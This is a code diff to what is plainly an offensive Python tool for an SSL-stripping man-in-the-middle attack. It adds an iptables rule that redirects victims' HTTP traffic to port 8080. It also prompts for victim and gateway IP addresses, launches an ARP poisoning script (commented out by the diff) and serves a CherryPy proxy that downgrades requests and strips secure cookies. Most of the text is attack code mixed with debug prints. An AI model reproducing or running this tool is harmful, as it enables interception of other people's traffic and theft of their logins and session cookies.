@@ -24,15 +24,21 @@ file.close()
 
 print "redirecting all http traffic to port 8080"
 os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-
+"""
 vIP = raw_input("Victim IP address?")
+gatewayIP = raw_input("Gateway IP address?")
 
 file = open("vIP.txt", "w+")
 file.write(vIP)
 file.close
 
-os.system("gnome-terminal -e 'python arpPoison.py' & disown")
+file = open("gatewayIP.txt", "w+")
+file.write(gatewayIP)
+file.close
 
+os.system("gnome-terminal -e 'python arpPoison.py'")
+"""
+print "Wololo"
 #Starting the stripping process
 
 def StripHTTPS(url, request):
@@ -69,9 +75,13 @@ def stripSecureCookie(response):
 
 class sslStripping(object):
     @cherrypy.expose
-    def main(self):
+    def default(self, *route):
+        print "hoi"
         url = cherrypy.url()
             
+        print url
+        print "hoi"
+
         url = str(url).replace("http", "https")
         
         response = requests.get(url)
@@ -82,12 +92,11 @@ class sslStripping(object):
 
         return response.content
 
-if __name__ == ' __main__':
-    cherrypy.config.update({'server.socket_host': '0.0.0.0' })
+print "Wololo"
 
-    cherrypy.quickstart(sslStripping)
-
-
-
-        
-
+if __name__ == '__main__':
+    print "Wololo"
+    # This command binds cherrypy to all interfaces of this machine, hence it is findable on the network on port 8080
+    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
+    # This command actually starts the server
+    cherrypy.quickstart(sslStripping())
